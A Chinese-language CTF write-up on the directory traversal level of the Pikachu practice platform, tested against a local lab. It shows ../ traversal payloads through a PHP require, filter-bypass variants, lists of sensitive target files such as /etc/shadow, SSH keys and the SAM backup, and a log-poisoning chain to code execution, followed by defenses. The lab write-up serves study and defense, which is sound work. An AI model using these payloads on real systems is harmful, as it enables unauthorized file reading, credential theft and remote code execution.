---
layout: post
title: Pikachu - 目录遍历 Writeup（require 穿越与页面嵌套）
platform: pikachu
date: 2026-10-29 20:38:00 +0800
categories: CTF
---

Pikachu - 目录遍历 Writeup（require 穿越与页面嵌套）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：目录遍历 → 目录遍历（`../../`）
- 地址：`http://localhost/pikachu/vul/dir/dir_list.php`
- 题型：Web
- 考点：**目录遍历**、`require` 的相对路径、页面嵌套

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
站点根目录：D:\phpstudy_pro\WWW\pikachu\
本关目录：D:\phpstudy_pro\WWW\pikachu\vul\dir\
```

**目录结构**：

```
vul\dir\
├── dir.php          3495 字节   概述页
├── dir_list.php     2370 字节   ★ 有漏洞的页面
└── soup\
    ├── jarheads.php 1006 字节   一篇短文（设置 $html）
    └── truman.php    127 字节   另一篇短文（设置 $html）
```

**页面形态**：

```text
(1)it's time to get up!
we're jarheads!

(2)it's time to say goodbye!
Truman's word!

（下面是短文内容）
```

**作者提示**：

```html
data-content="先好好读一下这两篇小短文在继续学习吧.."
```

**✅ 实测结果（6 种 payload）**

| # | `title` 参数 | 结果 |
|---|---|---|
| 1 | `jarheads.php` | 正常显示短文（34297 字节）✅ |
| 2 | `truman.php` | 正常显示短文（33423 字节）✅ |
| 3 | `xxx.php` | **require 失败**：`Failed opening ...` |
| 4 | **`../../../../../../Windows/win.ini`** | **读到系统文件**：[fonts] [extensions] [mci extensions] [files] [Mail] MAPI=1 ✅ |
| 5 | **`../../../index.php`** | **页面嵌套**：66158 字节，出现 **2 个 `<html>`** ✅ |
| 6 | **`../../../../../Extensions/php/php7.3.4nts/php.ini`** | **Parse error**（on line 182）❌ |
| 补 | `../../../inc/config.inc.php` | 被执行（无输出，页面 33320 字节）|

**★ 第 5 行的实测证据**：

```
正常页面：约 34000 字节，1 个 <html>
?title=../../../index.php → 66158 字节，2 个 <html>
★ 首页被 require 进来，嵌在了当前页面里
```

**★ 第 6 行的实测报错**：

```
Parse error: syntax error, unexpected 'and' (T_LOGICAL_AND), expecting end of file
in D:\phpstudy_pro\Extensions\php\php7.3.4nts\php.ini on line 182
```

二、题目分析

**① 漏洞代码：一行 require**

```php
<?php
// dir_list.php 第 18-24 行
$html = '';
if(isset($_GET['title'])){
    $filename = $_GET['title'];
    //这里直接把传进来的内容进行了require(),造成问题
    require "soup/$filename";          // ★ 有前缀 soup/，但能 ../ 穿越
//  echo $html;                        ← 这行被注释了
}
?>
```

**★ 页面靠 `$html` 输出**：

```html
<!-- 第 54-57 行 -->
<div>
    <?php echo $html;?>
</div>
```

**★ 正常的两个文件都是"给 `$html` 赋值"**：

```php
<?php
// soup/jarheads.php
$html = <<<A
<div id="dt_jarheads">
<pre>
a man has a lots of choices
...
we're professional fighting men！
we're jarheads！
</pre>
</div>
A;
?>
```

```php
<?php
// soup/truman.php
$html = <<<A
<pre>
Good morning,
and in case I don't see ya,
good afternoon, good evening, and good night!
</pre>
A;
?>
```

**★ 所以正常流程是**：

```
?title=jarheads.php
→ require "soup/jarheads.php"
→ jarheads.php 执行，$html 被赋值
→ dir_list.php 第 55 行 echo $html → 显示短文
```

**② ⭐ "目录遍历"的两种含义（先澄清概念）**

**★ 在 CTF 和渗透里，"目录遍历"有两个不同的意思**：

| 类型 | 含义 | 表现 |
|---|---|---|
| **广义（本关）** | 用 `../` 访问"非预期路径"的文件 | `?title=../../../index.php` |
| **狭义** | 能"列出目录里有哪些文件" | 访问 `/uploads/` 看到文件列表（Apache Autoindex）|

**★ 本关是广义那种**：

```
它不"列目录"，而是"用 ../ 让程序去读别的文件"
★ 本质上和第 29 关（文件包含）、第 31 关（文件下载）是同一类
★ 区别只在"它对文件做了什么"：
    文件包含 → 执行（本关用 require，也是执行）
    文件下载 → 原样输出
```

**★ 狭义的那种（目录浏览）长这样**：

```
访问 http://target/uploads/
→ Apache/Nginx 返回：
    Index of /uploads
    [ICO]  ../  shell.php  test.png
★ 这叫"目录浏览"（Directory Listing）
★ 需要服务器开启 autoindex on / Options +Indexes
★ 本关不是这种
```

**③ ⭐ `require` 是"执行"，不是"读取"**

**★ 这是本关最容易误判的地方。**

**★ 很多人以为**：

```
?title=../../inc/config.inc.php → 能读到配置文件的源码
★ 错！
```

**★ 实际**：

```
require 会把文件【当 PHP 代码执行】
→ config.inc.php 里只有 define()（不产生输出）
→ 页面看起来"没变化"
→ ★ 源码一点都没泄露
```

**★ 实测**：

```
?title=../../../inc/config.inc.php
→ 页面 33320 字节（和正常页面差不多）
→ 没有 DBPW / DBUSER 字样
★ 说明它被执行了，没有输出
```

**★ 第 6 行的 Parse error 是更直接的证据**：

```
?title=../../../../../Extensions/php/php7.3.4nts/php.ini
→ Parse error: unexpected 'and' (T_LOGICAL_AND) ... on line 182
```

**★ 为什么 php.ini 会报错？**

```ini
; php.ini 里的一行注释
; and this is a comment
└──┬──┘
  ★ PHP 把 ";" 当"语句结束符"？
  ★ 实际上 ";" 在 PHP 里是"空语句"
  ★ 然后 "and" 被当成逻辑运算符 → 语法错误
```

**★ 关键结论**：

```
require / include  = "执行文件"
file_get_contents / readfile = "读取内容"
★ 想读源码：用 php://filter 或"文件下载"
★ 用 require 读 .php：只能"执行"，拿不到源码
```

**④ ⭐ 页面嵌套：`../../../index.php`**

**★ 实测现象**：

```
?title=../../../index.php
→ 66158 字节（正常 34000）
→ 出现 2 个 <html> 标签
→ 页面上看到"两层"导航栏
```

**★ 为什么**：

```
require "../../../index.php"
→ 把 pikachu 的首页【包含进】当前页面
→ 首页自己也输出完整的 <html>...</html>
→ 结果：一个页面里嵌了另一个完整页面
```

**★ 这个现象的意义**：

```
它是"目录遍历成功"的最直观证据
    · 证明能从 vul\dir\soup\ 跑到 pikachu\ 根目录
    · 而且确实"包含并执行"了那个文件
★ 比"读文件"更能说明"穿越成功"
```

**⑤ 路径解析：为什么同样多 `../`，不同页面结果不同**

**★ 本关和第 31 关（文件下载）的一个对比**：

| 关卡 | 代码 | 读 `Windows/win.ini` 的结果 |
|---|---|---|
| 第 31 关 文件下载 | `"download/" . $filename` → `file_exists()` + `fopen()` | 6 个 `..` **失败** |
| **本关 目录遍历** | `require "soup/" . $filename` | 6 个 `..` **成功**（读到 92 字节的 win.ini）|

**★ 为什么不一样？**

```
① require 的相对路径解析顺序：
      include_path → 调用脚本所在目录 → 当前工作目录
   ★ 比 fopen() 的解析多了"include_path 回退"

② Windows 对"多余 .."的处理：
      超出盘符根时"停在根"，不报错
   ★ 所以"多写几个 .."是安全的

③ 实测确认：读到的 win.ini 是 92 字节
   C:\Windows\win.ini  → 存在，92 字节   ✅
   D:\Windows\win.ini  → 不存在
★ 说明最终的解析结果落到了 C 盘的系统文件
```

**★ 一个实用结论**：

```
打目录遍历时，".."的数量：
    · 先按"目标相对当前目录的层级"算
    · 然后"多写几个"也无所谓（Windows 宽容）
    · 如果失败，就多试几个（5、6、7、8）
★ 不要因为"算出来是 5 个"就死守 5 个
```

**⑥ 这关和"文件包含"的关系**

**★ 本质上是同一类漏洞**：

```php
// 第 29 关（文件包含）
include "include/$filename";

// 第 37 关（本关）
require "soup/$filename";
```

**★ 区别**：

| | `include` | `require` |
|---|---|---|
| 文件不存在时 | **Warning**，继续执行 | **Fatal error**，终止 |
| 用途 | 可选文件 | 必需文件 |
| 被利用时 | 一样能穿越 | 一样能穿越 |

**★ 本关用 `require` 的后果**：

```
· 穿越到不存在的文件 → 页面直接"截断"（Fatal error）
· 穿越到 .ini → Parse error（当 PHP 解析失败）
· 穿越到 .php → 执行
★ 所以本关的"好处"是：require 会报错，能当"探测信号"
```

三、解题步骤

**第 1 步：看正常功能**

```text
① 打开 http://localhost/pikachu/vul/dir/dir_list.php
② 点 "we're jarheads!" → 显示一段英文短文
③ 点 "Truman's word!"  → 显示另一段
④ 看 URL：
   dir_list.php?title=jarheads.php
                 └──┬──┘
              参数名 title
```

**第 2 步：试个不存在的文件（看报错）**

```
http://localhost/pikachu/vul/dir/dir_list.php?title=xxx.php
```

**★ 页面底部出现**：

```
Warning: require(soup/xxx.php): failed to open stream: No such file or directory
Fatal error: require(): Failed opening required 'soup/xxx.php' ...
```

**★ 这个报错很有用**：

```
① 它告诉你"路径拼的是 soup/xxx.php"
② 它泄露了绝对路径（D:\phpstudy_pro\WWW\pikachu\vul\dir\dir_list.php）
★ 这是"信息泄露"，方便你算层级
```

**第 3 步：⭐ 穿越到上级目录（页面嵌套）**

**★ 地址栏粘**：

```
http://localhost/pikachu/vul/dir/dir_list.php?title=../../../index.php
```

**★ 预期**：

```
页面变长（66158 字节）
出现了"两层"页面结构（两个导航栏、两个 footer）
```

**★ F12 验证**：

```
① F12 → 元素
② Ctrl+F 搜 "<html"
③ 会看到 2 个匹配
④ ★ 这就是"页面嵌套"
```

**★ 为什么是 3 个 `..`？**

```
起点：D:\phpstudy_pro\WWW\pikachu\vul\dir\soup\
  ../ → dir\
  ../ → vul\
  ../ → pikachu\        ★ 到这里
  index.php → pikachu\index.php ✅
```

**第 4 步：⭐ 穿越到系统目录（读 win.ini）**

```
http://localhost/pikachu/vul/dir/dir_list.php?title=../../../../../../Windows/win.ini
```

**★ 预期**：页面中间出现：

```ini
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

**★ 实测成功**（页面 33412 字节，内容对应 `C:\Windows\win.ini`，92 字节）。

**★ 如果没读到**，就调整 `..` 的数量（5、6、7、8 都试试）：

```
?title=../../../../../Windows/win.ini
?title=../../../../../../Windows/win.ini
?title=../../../../../../../Windows/win.ini
```

**★ Windows 对多余的 `..` 是宽容的**（停在盘符根）。

**第 5 步：体验"require 是执行"**

```
http://localhost/pikachu/vul/dir/dir_list.php?title=../../../../../Extensions/php/php7.3.4nts/php.ini
```

**★ 预期**：

```
Parse error: syntax error, unexpected 'and' (T_LOGICAL_AND) ...
in D:\phpstudy_pro\Extensions\php\php7.3.4nts\php.ini on line 182
```

**★ 这个报错证明**：

```
require 不是"读文件"，是"当 PHP 代码执行"
→ php.ini 里的 "; and ..." 被当代码 → 语法错误
```

**第 6 步：对比"执行"和"读"**

**★ 试这个（配置文件，会被执行但无输出）**：

```
?title=../../../inc/config.inc.php
```

**★ 结果**：页面"没变化"（33320 字节），**看不到 DBPW**。

**★ 想真的"读"到源码，要用别的路子**：

```
① 第 31 关的"文件下载"（Content-Disposition: attachment → 原样发字节）
② php://filter（如果目标是 LFI 且没有前缀）
    ?title=php://filter/convert.base64-encode/resource=../../../inc/config.inc.php
    ★ 但本关有 soup/ 前缀 → php://filter 会被破坏（同第 29 关）
```

**第 7 步：完整 payload 汇总**

```
// ========== 正常 ==========
jarheads.php
truman.php

// ========== 穿越到上级目录（页面嵌套）==========
../../../index.php
../../../dir.php
../../../vul/sqli/sqli_str.php

// ========== 穿越到配置文件（会被执行，无输出）==========
../../../inc/config.inc.php

// ========== 穿越到系统文件（读到内容）==========
../../../../../../Windows/win.ini
../../../../../../Windows/System32/drivers/etc/hosts

// ========== 穿越到非 PHP 文件（会被当代码解析，可能 Parse error）==========
../../../../../Extensions/php/php7.3.4nts/php.ini
```

四、延伸知识

**① 常见的"目录遍历参数名"**

**★ 只要参数值"看起来像文件名"，就值得试 `../`**：

| 参数名 | 常见场景 |
|---|---|
| `file` / `filename` / `filepath` | 文件下载 |
| `page` / `p` / `view` | 页面包含（`?page=about.php`）|
| `title` / `name` | **本关** |
| `template` / `tpl` | 模板加载 |
| `lang` / `language` | 语言包加载（`?lang=en.php`）|
| `theme` | 主题加载 |
| `img` / `image` / `pic` | 图片显示 |
| `doc` / `document` | 文档预览 |
| `log` / `logfile` | 日志查看 |
| `url` | URL 包含（SSRF 也会用）|

**★ 测试方法**：

```
把所有这种参数的值换成：
    ../../../../etc/passwd        （Linux）
    ..\..\..\..\Windows\win.ini   （Windows）
    ....//....//....//etc/passwd  （过滤 ../ 时）
```

**② 目录遍历的"变形"技巧（绕过过滤）**

**★ 如果代码过滤了 `../`，可以试**：

**变形 1：编码**

```
..%2f..%2f..%2fetc/passwd          （URL 编码 /）
..%5c..%5c..%5cWindows/win.ini     （URL 编码 \）
%2e%2e%2f%2e%2e%2fetc/passwd       （编码 . 和 /）
%252e%252e%252f                    （双重 URL 编码）
```

**变形 2：双写（过滤 `../` 时）**

```
....//....//....//etc/passwd
→ 过滤掉中间的 "../" 后 → ../../../../etc/passwd ✅
```

**变形 3：混合分隔符**

```
..\../..\../etc/passwd
..%5c../etc/passwd
```

**变形 4：绝对路径（如果前缀能被绕过）**

```
/etc/passwd
C:\Windows\win.ini
```

**变形 5：`..;` 分隔（某些服务器）**

```
..;/..;/..;/etc/passwd
```

**变形 6：超长路径截断（老系统）**

```
../ 重复 200 次 + etc/passwd
→ 超过系统路径长度限制 → 前缀被截断
```

**③ 目录遍历的"高价值目标"**

**Windows**：

```
C:\Windows\win.ini                         ← 本关用的
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\inetsrv\config\applicationHost.config
C:\Windows\repair\SAM  （SAM 备份，可提取哈希）
X:\...\web.config
X:\...\php.ini
```

**Linux**：

```
/etc/passwd
/etc/shadow            （需 root）
/etc/hosts
/etc/ssh/sshd_config
/root/.bash_history
/root/.ssh/id_rsa
/var/log/auth.log
/proc/self/environ     （可能有环境变量里的密钥）
```

**应用自身**：

```
config.php / .env / .git/config / backup.sql / www.zip
```

**★ 本关特殊**：

```
因为用的是 require（执行），
所以"读 .php 源码"这条路走不通
→ 只能"读非 PHP 文件"（ini/txt/log）或"执行已有 PHP"
★ 要读源码得换成"文件下载"或"php://filter"
```

**④ 目录遍历 vs 目录浏览（Directory Listing）**

**★ 这两个经常被混淆**：

| | **目录遍历**（本关）| **目录浏览** |
|---|---|---|
| 靠什么 | 代码里的 `../` 拼接 | 服务器配置 `autoindex on` |
| 表现 | 用参数控制路径 | 直接访问目录 URL |
| 例子 | `?file=../../../etc/passwd` | `http://target/uploads/` 看到文件列表 |
| 修复 | 白名单 / basename | 关闭 autoindex |
| 危害 | 读任意文件 | 泄露文件结构 |

**★ 本环境有没有"目录浏览"？**

```
Apache 默认关闭（Options -Indexes）
★ 但很多"开发环境"会开 → 能直接看到目录里有什么
★ 这也是"信息收集"的重要一步
```

**⑤ 真实世界的目录遍历案例**

**案例 1：某网盘的"下载"**

```
GET /download?file=report.pdf
→ 改成 file=../../../../etc/passwd
★ 典型
```

**案例 2：某 CMS 的"语言包"**

```
GET /?lang=en.php
→ 改成 lang=../../../../etc/passwd
★ 很多老 CMS 有这个问题
```

**案例 3：某 OA 的"模板预览"**

```
GET /preview?tpl=default.html
→ 改成 tpl=../../../../WEB-INF/web.xml
★ 读到 Java 配置
```

**案例 4：日志文件读取（配合 getshell）**

```
① 让 Web 服务器把 PHP 代码写进日志
   GET /<?php system($_GET['c']);?> HTTP/1.1
② 用目录遍历读日志
   ?file=../../../../var/log/apache2/access.log
③ PHP 代码被执行 → getshell
★ 这是"目录遍历 → RCE"的经典路径
```

**⑥ 防御（四层）**

**❌ 本关的反面教材**：

```php
$filename = $_GET['title'];
require "soup/$filename";        // 直接拼接
```

**✅ 第 1 层：白名单（最稳）**

```php
$allowed = ['jarheads.php', 'truman.php'];
$filename = $_GET['title'] ?? '';
if (!in_array($filename, $allowed, true)) {
    die('非法的文件');
}
require "soup/" . $filename;
```

**★ 为什么白名单最稳**：

```
它不关心攻击者用什么编码/变形
因为只允许"预先写死的两个值"
★ 黑名单（过滤 ../）永远能被绕过
```

**✅ 第 2 层：`basename()` 去掉路径**

```php
$filename = basename($_GET['title']);
// "../../../etc/passwd" → "passwd"
require "soup/" . $filename;
```

**★ 注意**：

```
· basename 在 Windows 和 Linux 上对 \ / 的处理不同
· 可能被 "..\..\x" 绕过（Linux 下 \ 不是分隔符）
★ 所以要和"只允许字母数字点"的正则配合
```

**✅ 第 3 层：映射表（ID → 文件）**

```php
$map = ['1' => 'jarheads.php', '2' => 'truman.php'];
$id = $_GET['id'] ?? '';
if (!isset($map[$id])) die('非法');
require "soup/" . $map[$id];
```

**✅ 第 4 层：`open_basedir` 限制**

```ini
; php.ini
open_basedir = D:/phpstudy_pro/WWW/pikachu/
```

**★ 效果**：

```
即使有穿越，也只能访问这个目录内
→ 读不到 C:\Windows\win.ini
→ 读不到 D:\phpstudy_pro\Extensions\php\php7.3.4nts\php.ini
★ 但依然能"包含/执行"网站内的文件
```

**★ 所以"纵深防御"是**：

```
白名单（根本） + basename（辅助） + open_basedir（限制范围）
+ 关闭错误显示（减少信息泄露）
```

五、总结

- **本题核心：`require "soup/$filename"` 直接拼接用户输入 → 可以用 `../` 穿越到任意目录，读到/执行别的文件。**

- **一行漏洞代码 + 一行输出**：

```php
require "soup/$filename";        // ★ 前缀 + 零过滤
...
<?php echo $html;?>              // 被 require 的文件给 $html 赋值，这里输出
```

- **⭐ 八个必记要点**：

```text
① "目录遍历"有两种含义
   广义：用 ../ 访问非预期路径（本关）
   狭义：能列出目录内容（Autoindex）
   ★ 本关是广义那种

② require 是"执行"，不是"读取"
   读 .php → 执行（拿不到源码）
   读 .ini → 当 PHP 解析 → Parse error
   ★ 想读源码用"文件下载"或 php://filter

③ 页面嵌套是"穿越成功"的直观证据
   ?title=../../../index.php → 页面里出现 2 个 <html>
   ★ 66158 字节（正常 34000）

④ 实测能读到系统文件
   ?title=../../../../../../Windows/win.ini
   → [fonts] [extensions] MAPI=1（92 字节，对应 C:\Windows\win.ini）

⑤ ".." 的数量要"多试几个"
   先按层级算，然后 5/6/7/8 都试
   ★ Windows 对多余 .. 宽容（停在盘符根）

⑥ 不同页面的"同样 .."结果不同
   require 的解析受 include_path / 工作目录影响
   fopen 的解析更"直接"
   ★ 所以 31 关失败、37 关成功是正常的

⑦ 报错信息是"探测信号"
   require 失败会告诉你"拼的路径是什么"
   还会泄露绝对路径 → 方便算层级

⑧ 防御：白名单 > basename > 映射表 > open_basedir
   ★ 黑名单（过滤 ../）永远能被绕过（编码/双写/混合分隔符）
```

- **实测数据**：

```text
jarheads.php                                    → 34297 字节，正常
truman.php                                      → 33423 字节，正常
xxx.php                                         → Failed opening（require 失败）
../../../index.php                              → 66158 字节，2 个 <html>（页面嵌套）
../../../../../../Windows/win.ini                → 33412 字节，含 [fonts] MAPI=1
../../../../../Extensions/.../php.ini            → Parse error on line 182
../../../inc/config.inc.php                     → 33320 字节，被执行（无源码泄露）

路径核对：
    C:\Windows\win.ini              → 存在，92 字节   ✅（读到的是它）
    D:\Windows\win.ini              → 不存在
```

- **进度**：

```text
platform: pikachu   37 篇

├── 暴力破解            4/4    ✅
├── CSRF                3/3    ✅
├── XSS                10/10   ✅
├── SQL 注入           10/10   ✅
├── RCE                 2/2    ✅
├── File Inclusion      2/2    ✅
├── Unsafe Filedownload 1/1    ✅
├── Unsafe Fileupload   3/7    （暂停，剩 4 关）
├── Over Permission     2/2    ✅
└── 目录遍历            1/1    ✅  ← 刚完成
```

**手工复现要点**：

```text
· 点 "we're jarheads!" → 正常显示短文
· ?title=xxx.php → 看 require 失败的报错（泄露绝对路径）
· ?title=../../../index.php → 页面嵌套（F12 里 2 个 <html>）
· ?title=../../../../../../Windows/win.ini → 读到 [fonts] MAPI=1
· ?title=../../../../../Extensions/.../php.ini → Parse error（证明 require 是"执行"）
· ?title=../../../inc/config.inc.php → 页面无变化（被执行但无输出）
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  目录遍历 = "用 ../ 让程序去读它不该读的文件"                    │
│                                                            │
│  require "soup/$filename"                                  │
│      → ?title=../../../index.php        （页面嵌套）          │
│      → ?title=../../../../../../Windows/win.ini（读系统文件）  │
│                                                            │
│  ★ require 是【执行】不是【读取】                              │
│      .php → 执行（拿不到源码）                                │
│      .ini → 当代码解析 → Parse error                         │
│                                                            │
│  ★ ".." 多写几个也无所谓（Windows 宽容）                       │
│  ★ 页面嵌套（2 个 <html>）是穿越成功的直观证据                   │
│  ★ 防御：白名单（唯一靠得住），黑名单必败                        │
└────────────────────────────────────────────────────────────┘
```
